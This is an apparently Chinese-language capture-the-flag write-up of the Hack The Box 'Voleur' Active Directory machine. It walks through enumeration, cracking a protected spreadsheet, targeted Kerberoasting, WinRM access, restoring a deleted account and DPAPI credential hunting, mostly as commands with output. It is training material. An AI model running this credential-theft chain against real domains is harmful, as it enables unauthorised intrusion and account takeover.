{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Voleur","contentHtml":"<h1>Season8 - Voleur</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Voleur\">https://app.hackthebox.com/machines/Voleur</a> | <code>Window</code> | <code>Medium</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image.png\" alt=\"image.png\"></p>\n<p>**Machine Information ：**As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt</p>\n<h2>Recon</h2>\n<h3>端口 &#x26; 凭据</h3>\n<pre><code class=\"hljs language-bash\">➜  Voleur nmap -sT -min-rate 5000 -p- 10.10.11.76     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 21:21 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.76\nHost is up (0.048s latency).\nNot shown: 65525 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n593/tcp   open  http-rpc-epmap\n3268/tcp  open  globalcatLDAP\n49668/tcp open  unknown\n57745/tcp open  unknown\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 26.57 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Voleur nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 10.10.11.76\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 05:00 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.76\nHost is up (0.14s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-07-06 21:00:21Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)\n49668/tcp open  msrpc         Microsoft Windows RPC\n57745/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning (JUST GUESSING): Microsoft Windows 10|11|2016 (90%)\nOS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows 10 - 11 (90%), Microsoft Windows Server 2016 (90%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-07-06T21:01:35\n|_  start_date: N/A\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   152.79 ms 10.10.16.1\n2   152.85 ms 10.10.11.76\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 124.00 seconds\n</code></pre>\n<p>测试凭据，需要指定<code>Kerberos</code>认证</p>\n<pre><code class=\"hljs language-bash\">➜  Voleur nxc ldap 10.10.11.76 -u ryan.naylor -p <span class=\"hljs-string\">'HollowOct31Nyt'</span> -d voleur.htb    \nLDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb)\nLDAP        10.10.11.76     389    DC               [-] voleur.htb\\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED\n➜  Voleur nxc ldap 10.10.11.76 -u ryan.naylor -p <span class=\"hljs-string\">'HollowOct31Nyt'</span> -d voleur.htb -k \nLDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb)\nLDAP        10.10.11.76     389    DC               [+] voleur.htb\\ryan.naylor:HollowOct31Nyt \n</code></pre>\n<p>枚举用户</p>\n<pre><code class=\"hljs language-bash\">➜  Voleur nxc ldap 10.10.11.76 -u ryan.naylor -p <span class=\"hljs-string\">'HollowOct31Nyt'</span> -d voleur.htb -k --<span class=\"hljs-built_in\">users</span>\nLDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb)\nLDAP        10.10.11.76     389    DC               [+] voleur.htb\\ryan.naylor:HollowOct31Nyt \nLDAP        10.10.11.76     389    DC               [*] Enumerated 11 domain <span class=\"hljs-built_in\">users</span>: voleur.htb\nLDAP        10.10.11.76     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-\nLDAP        10.10.11.76     389    DC               Administrator                 2025-01-29 04:35:13 0        Built-<span class=\"hljs-keyword\">in</span> account <span class=\"hljs-keyword\">for</span> administering the computer/domain\nLDAP        10.10.11.76     389    DC               Guest                         &#x3C;never>             0        Built-<span class=\"hljs-keyword\">in</span> account <span class=\"hljs-keyword\">for</span> guest access to the computer/domain\nLDAP        10.10.11.76     389    DC               krbtgt                        2025-01-29 16:43:06 0        Key Distribution Center Service Account\nLDAP        10.10.11.76     389    DC               ryan.naylor                   2025-01-29 17:26:46 0        First-Line Support Technician\nLDAP        10.10.11.76     389    DC               marie.bryant                  2025-01-29 17:21:07 2        First-Line Support Technician\nLDAP        10.10.11.76     389    DC               lacey.miller                  2025-01-29 17:20:10 3        Second-Line Support Technician\nLDAP        10.10.11.76     389    DC               svc_ldap                      2025-01-29 17:20:54 0                  \nLDAP        10.10.11.76     389    DC               svc_backup                    2025-01-29 17:20:36 3                  \nLDAP        10.10.11.76     389    DC               svc_iis                       2025-01-29 17:20:45 0                  \nLDAP        10.10.11.76     389    DC               jeremy.combs                  2025-01-29 23:10:32 3        Third-Line Support Technician\nLDAP        10.10.11.76     389    DC               svc_winrm                     2025-01-31 17:10:12 0                  \n</code></pre>\n<h3>BloodHound</h3>\n<p>上<code>Bloodhound</code></p>\n<pre><code class=\"hljs language-bash\">➜  Voleur bloodhound-python -k -d <span class=\"hljs-string\">'voleur.htb'</span> -ns 10.10.11.76 --zip -c All -dc <span class=\"hljs-string\">'DC.voleur.htb'</span> -u ryan.naylor -p HollowOct31Nyt \nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: voleur.htb\nINFO: Using TGT from cache\nINFO: Found TGT with correct principal <span class=\"hljs-keyword\">in</span> ccache file.\nINFO: Connecting to LDAP server: DC.voleur.htb\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC.voleur.htb\nINFO: Found 12 <span class=\"hljs-built_in\">users</span>\nINFO: Found 56 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 5 ous\nINFO: Done <span class=\"hljs-keyword\">in</span> 03M 01S                   \nINFO: Compressing output into 20250707052145_bloodhound.zip  \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image1.png\" alt=\"image.png\"></p>\n<p>突然发现有三个有趣的组</p>\n<pre><code class=\"hljs language-bash\">MATCH (g:Group) WHERE g.name CONTAINS <span class=\"hljs-string\">'TECHNICIANS'</span> RETURN g                                                                                                \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image2.png\" alt=\"image.png\"></p>\n<p>当前我们的用户属于<code>FIRST-LINE TECHNICIANS</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image3.png\" alt=\"image.png\"></p>\n<p>属于远程组用户有两个，我更倾向于<code>JEREMY.COMBS</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image4.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image5.png\" alt=\"image.png\"></p>\n<h3>SMB Recon</h3>\n<p>但是我们当前用户无法执行任何操作，我们回到<code>SMB</code></p>\n<pre><code class=\"hljs language-bash\">// 生成 krb5.conf 文件\n➜  Voleur nxc smb DC.voleur.htb -u <span class=\"hljs-string\">'ryan.naylor'</span> -p <span class=\"hljs-string\">'HollowOct31Nyt'</span> -k --generate-krb5-file krb5.conf\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor:HollowOct31Nyt\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Voleur getTGT.py voleur.htb/ryan.naylor:<span class=\"hljs-string\">'HollowOct31Nyt'</span> -dc-ip 10.10.11.76 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n[*] Saving ticket <span class=\"hljs-keyword\">in</span> ryan.naylor.ccache\n\n➜  Voleur <span class=\"hljs-built_in\">export</span> KRB5CCNAME=ryan.naylor.ccache     \n                              \n➜  Voleur nxc smb DC.voleur.htb -u ryan.naylor -d voleur.htb -k --use-kcache\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor from ccache \n</code></pre>\n<p>记得加上 <code>--smb-timeout 9999</code> ，否则可能会出现：<code>The NETBIOS connection with the remote host timed out.</code></p>\n<pre><code class=\"hljs language-bash\">➜  Voleur nxc smb DC.voleur.htb -u ryan.naylor -d voleur.htb -k --use-kcache --shares --smb-timeout 9999\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor from ccache \nSMB         DC.voleur.htb   445    DC               [*] Enumerated shares\nSMB         DC.voleur.htb   445    DC               Share           Permissions     Remark\nSMB         DC.voleur.htb   445    DC               -----           -----------     ------\nSMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin\nSMB         DC.voleur.htb   445    DC               C$                              Default share\nSMB         DC.voleur.htb   445    DC               Finance                         \nSMB         DC.voleur.htb   445    DC               HR                              \nSMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC\nSMB         DC.voleur.htb   445    DC               IT              READ            \nSMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share \nSMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share \n</code></pre>\n<p>使用<code>nxc</code>运行模块列出所有可读文件</p>\n<pre><code class=\"hljs language-bash\">➜  Voleur nxc smb DC.voleur.htb -u ryan.naylor -d voleur.htb -k --use-kcache --smb-timeout 9999 -M spider_plus\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor from ccache \nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Started module spidering_plus with the following options:\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  DOWNLOAD_FLAG: False\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]     STATS_FLAG: True\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] EXCLUDE_FILTER: [<span class=\"hljs-string\">'print$'</span>, <span class=\"hljs-string\">'ipc$'</span>]\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]   EXCLUDE_EXTS: [<span class=\"hljs-string\">'ico'</span>, <span class=\"hljs-string\">'lnk'</span>]\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         DC.voleur.htb   445    DC               [*] Enumerated shares\nSMB         DC.voleur.htb   445    DC               Share           Permissions     Remark\nSMB         DC.voleur.htb   445    DC               -----           -----------     ------\nSMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin\nSMB         DC.voleur.htb   445    DC               C$                              Default share\nSMB         DC.voleur.htb   445    DC               Finance                         \nSMB         DC.voleur.htb   445    DC               HR                              \nSMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC\nSMB         DC.voleur.htb   445    DC               IT              READ            \nSMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share \nSMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share \nSPIDER_PLUS DC.voleur.htb   445    DC               [+] Saved share-file metadata to <span class=\"hljs-string\">\"/root/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json\"</span>.\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Filtered Shares:  1\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Total folders found:  27\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Total files found:    7\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size average:    3.55 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size min:        22 B\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size max:        16.5 KB\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image6.png\" alt=\"image.png\"></p>\n<p>转储所有文件</p>\n<pre><code class=\"hljs language-bash\">➜  Voleur nxc smb DC.voleur.htb -u ryan.naylor -d voleur.htb -k --use-kcache --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\ryan.naylor from ccache \nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Started module spidering_plus with the following options:\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]     STATS_FLAG: True\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] EXCLUDE_FILTER: [<span class=\"hljs-string\">'print$'</span>, <span class=\"hljs-string\">'ipc$'</span>]\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]   EXCLUDE_EXTS: [<span class=\"hljs-string\">'ico'</span>, <span class=\"hljs-string\">'lnk'</span>]\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         DC.voleur.htb   445    DC               [*] Enumerated shares\nSMB         DC.voleur.htb   445    DC               Share           Permissions     Remark\nSMB         DC.voleur.htb   445    DC               -----           -----------     ------\nSMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin\nSMB         DC.voleur.htb   445    DC               C$                              Default share\nSMB         DC.voleur.htb   445    DC               Finance                         \nSMB         DC.voleur.htb   445    DC               HR                              \nSMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC\nSMB         DC.voleur.htb   445    DC               IT              READ            \nSMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share \nSMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share \nSPIDER_PLUS DC.voleur.htb   445    DC               [+] Saved share-file metadata to <span class=\"hljs-string\">\"/root/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json\"</span>.\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] SMB Filtered Shares:  1\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Total folders found:  27\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Total files found:    7\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size average:    3.55 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size min:        22 B\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File size max:        16.5 KB\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] File unique exts:     5 (pol, ini, xlsx, inf, csv)\nSPIDER_PLUS DC.voleur.htb   445    DC               [*] Downloads successful: 7\nSPIDER_PLUS DC.voleur.htb   445    DC               [+] All files processed successfully.\n</code></pre>\n<h3>xlsx Crack</h3>\n<p>打开<code>xlsx</code>文件需要密码</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image7.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  Voleur office2john Access_Review.xlsx > xslxPass.txt\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Voleur john --wordlist=/usr/share/wordlists/rockyou.txt xslxPass.txt \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])\nCost 1 (MS Office version) is 2013 <span class=\"hljs-keyword\">for</span> all loaded hashes\nCost 2 (iteration count) is 100000 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nfootball1        (Access_Review.xlsx)     \n1g 0:00:00:05 DONE (2025-07-07 06:52) 0.1945g/s 161.8p/s 161.8c/s 161.8C/s football1..legolas\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed.\n</code></pre>\n<p>内容是：</p>\n<table>\n<thead>\n<tr>\n<th>User</th>\n<th>Job Title</th>\n<th>Permissions</th>\n<th>Notes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Ryan.Naylor</td>\n<td>First-Line Support Technician</td>\n<td>SMB</td>\n<td>Has Kerberos Pre-Auth disabled temporarily to test legacy systems.</td>\n</tr>\n<tr>\n<td>Marie.Bryant</td>\n<td>First-Line Support Technician</td>\n<td>SMB</td>\n<td></td>\n</tr>\n<tr>\n<td>Lacey.Miller</td>\n<td>Second-Line Support Technician</td>\n<td>Remote Management Users</td>\n<td></td>\n</tr>\n<tr>\n<td><del>Todd.Wolfe</del></td>\n<td>Second-Line Support Technician</td>\n<td>Remote Management Users</td>\n<td>Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.</td>\n</tr>\n<tr>\n<td>Jeremy.Combs</td>\n<td>Third-Line Support Technician</td>\n<td>Remote Management Users.</td>\n<td>Has access to Software folder.</td>\n</tr>\n<tr>\n<td>Administrator</td>\n<td>Administrator</td>\n<td>Domain Admin</td>\n<td>Not to be used for daily tasks!</td>\n</tr>\n<tr>\n<td>Service Accounts</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>svc_backup</td>\n<td></td>\n<td>Windows Backup</td>\n<td>Speak to Jeremy!</td>\n</tr>\n<tr>\n<td>svc_ldap</td>\n<td></td>\n<td>LDAP Services</td>\n<td>P/W - M1XyC9pW7qT5Vn</td>\n</tr>\n<tr>\n<td>svc_iis</td>\n<td></td>\n<td>IIS Administration</td>\n<td>P/W - N5pXyW1VqM7CZ8</td>\n</tr>\n<tr>\n<td>svc_winrm</td>\n<td></td>\n<td>Remote Management</td>\n<td>Need to ask Lacey as she reset this recently.</td>\n</tr>\n</tbody>\n</table>\n<h2><strong>Targeted Kerberoasting</strong></h2>\n<p>我们拥有了<code>svc_ldap</code> 和 <code>svc_iis</code> 的密码</p>\n<p>并且 <code>svc_ldap</code> 拥有对 <code>svc_winrm</code>  的 <code>WirteSPN</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image8.png\" alt=\"image.png\"></p>\n<p>可以使用 <code>Targeted Kerberoasting</code> 攻击，Tools：<a href=\"https://github.com/ShutdownRepo/targetedKerberoast\">https://github.com/ShutdownRepo/targetedKerberoast</a></p>\n<pre><code class=\"hljs language-bash\">➜  Voleur getTGT.py voleur.htb/svc_ldap:<span class=\"hljs-string\">'M1XyC9pW7qT5Vn'</span> -dc-ip 10.10.11.76 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> svc_ldap.ccache\n\n➜  Voleur <span class=\"hljs-built_in\">export</span> KRB5CCNAME=svc_ldap.ccache\n</code></pre>\n<pre><code class=\"hljs language-bash\">python targetedKerberoast.py -v -d voleur.htb --dc-ip 10.10.11.76 --dc-host dc.voleur.htb -u svc_ldap -k --no-pass\n</code></pre>\n<p>PS：不清楚为什么<code>todd.wolfe</code> 被删掉了还能拿到，可能是被其他人恢复了，题目应该是要我们恢复账户的</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image9.png\" alt=\"image.png\"></p>\n<p>使用<code>hashcat</code>破解</p>\n<pre><code class=\"hljs language-bash\">➜  targetedKerberoast hashcat -h | grep Kerberos\n  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol\n  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol\n  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol\n  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol\n  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol\n  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol\n   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol\n  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol\n  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Voleur hashcat -m 13100 kerberos_TGS_23 /usr/share/wordlists/rockyou.txt \n</code></pre>\n<p>最后可以拿到<code>svc_winrm</code> 的密码 <code>AFireInsidedeOzarctica980219afi</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image10.png\" alt=\"image.png\"></p>\n<p>尝试<code>winrm</code>登录</p>\n<pre><code class=\"hljs language-bash\">➜  Voleur getTGT.py voleur.htb/svc_winrm:<span class=\"hljs-string\">'AFireInsidedeOzarctica980219afi'</span> -dc-ip 10.10.11.76 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> svc_winrm.ccache\n\n➜  Voleur <span class=\"hljs-built_in\">export</span> KRB5CCNAME=svc_winrm.ccache \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image11.png\" alt=\"image.png\"></p>\n<p>读取<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\svc_winrm\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\nf32246ed77a6xxxxxxx\n</code></pre>\n<h2>恢复账户</h2>\n<p>之前的<code>xlsx</code>中有被删除的用户<code>Todd.Wolfe</code>，我们查看一下是否存在</p>\n<p>新版本中的 <code>BloodyAD</code>可以对已删除的用户进行恢复了，免去了很多操作</p>\n<p>侦查是否有被删除用户：</p>\n<pre><code class=\"hljs language-bash\">// 通过 RunasCs.exe 获得的 Shell\nPS C:\\Windows\\system32> Get-ADObject -Filter <span class=\"hljs-string\">'isDeleted -eq $true'</span> -IncludeDeletedObjects\nGet-ADObject -Filter <span class=\"hljs-string\">'isDeleted -eq $true'</span> -IncludeDeletedObjects\n\nDeleted           : True\nDistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb\nName              : Deleted Objects\nObjectClass       : container\nObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8\n\nDeleted           : True\nDistinguishedName : CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb\nName              : Todd Wolfe\n                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db\nObjectClass       : user\nObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db\n</code></pre>\n<pre><code class=\"hljs language-bash\">// 通过 BloodyAD\n➜  Voleur bloodyAD -d voleur.htb --host dc.voleur.htb -u svc_ldap -k get search --filter <span class=\"hljs-string\">\"(isDeleted=TRUE)\"</span> --attr distinguishedName -c 1.2.840.113556.1.4.2064 |grep Todd\ndistinguishedName: CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb\n</code></pre>\n<p>使用<code>BloodyAD</code>恢复账户</p>\n<pre><code class=\"hljs language-bash\">➜  Voleur bloodyAD -d voleur.htb --host dc.voleur.htb -u svc_ldap -k <span class=\"hljs-built_in\">set</span> restore todd.wolfe \n[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb\n</code></pre>\n<p>恢复后，我们将<code>BloodHound</code>数据更新一下</p>\n<pre><code class=\"hljs language-bash\">➜  Voleur bloodhound-python -k -d <span class=\"hljs-string\">'voleur.htb'</span> -ns 10.10.11.76 --zip -c All -dc <span class=\"hljs-string\">'DC.voleur.htb'</span> -u todd.wolfe -p NightT1meP1dg3on14 \nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: voleur.htb\nINFO: Using TGT from cache\nWARNING: Username <span class=\"hljs-keyword\">in</span> ccache file does not match supplied username! svc_ldap@VOLEUR.HTB != todd.wolfe@VOLEUR.HTB\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: DC.voleur.htb\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC.voleur.htb\nINFO: Found 13 <span class=\"hljs-built_in\">users</span>\nINFO: Found 56 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 5 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC.voleur.htb\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 10S\nINFO: Compressing output into 20250707211514_bloodhound.zip\n</code></pre>\n<pre><code class=\"hljs language-bash\">getTGT.py voleur.htb/todd.wolfe:<span class=\"hljs-string\">'NightT1meP1dg3on14'</span> -dc-ip 10.10.11.76 -k \n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image12.png\" alt=\"image.png\"></p>\n<h2>DPAPI</h2>\n<p>我们下一个用户应该是<code>Jeremy.Combs</code> 因为他有 <code>Has access to Software folder.</code></p>\n<p>我们从<code>todd.wolfe</code>寻找可以横向的方法</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Voleur/image13.png\" alt=\"image.png\"></p>\n<p>可以看到<code>todd</code>属于<code>SECOND_LINE</code> ，看一下<code>SMB</code></p>\n<pre><code class=\"hljs language-bash\">➜  Voleur <span class=\"hljs-built_in\">export</span> KRB5CCNAME=todd.wolfe.ccache\n\n➜  Voleur nxc smb DC.voleur.htb -u todd.wolfe -d voleur.htb -k --use-kcache --smb-timeout 9999\nSMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         DC.voleur.htb   445    DC               [+] voleur.htb\\todd.wolfe from ccache \n</code></pre>\n<p>使用<code>smbclient.py</code> 进行连接，<code>nxc</code>会有点问题</p>\n<pre><code class=\"hljs language-bash\">➜  Voleur smbclient.py -k DC.VOLEUR.HTB\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nType <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> list of commands\n<span class=\"hljs-comment\"># shares</span>\nADMIN$\nC$\nFinance\nHR\nIPC$\nIT\nNETLOGON\nSYSVOL\n</code></pre>\n<p>貌似偶<code>DPAPI</code>可以打（其实在<code>svc_ldap</code>用户中也有<code>DPAPI</code>）</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># use IT</span>\n\n<span class=\"hljs-comment\"># pwd</span>\n/Second-Line Support/Archived Users/todd.wolfe/AppDAta/Roaming/Microsoft/Credentials\n<span class=\"hljs-comment\"># ls</span>\ndrw-rw-rw-          0  Wed Jan 29 23:13:09 2025 .\ndrw-rw-rw-          0  Wed Jan 29 23:13:09 2025 ..\n-rw-rw-rw-        398  Wed Jan 29 21:13:50 2025 772275FAD58525253490A9B0039791D3\n\n<span class=\"hljs-comment\"># pwd</span>\n/Second-Line Support/Archived 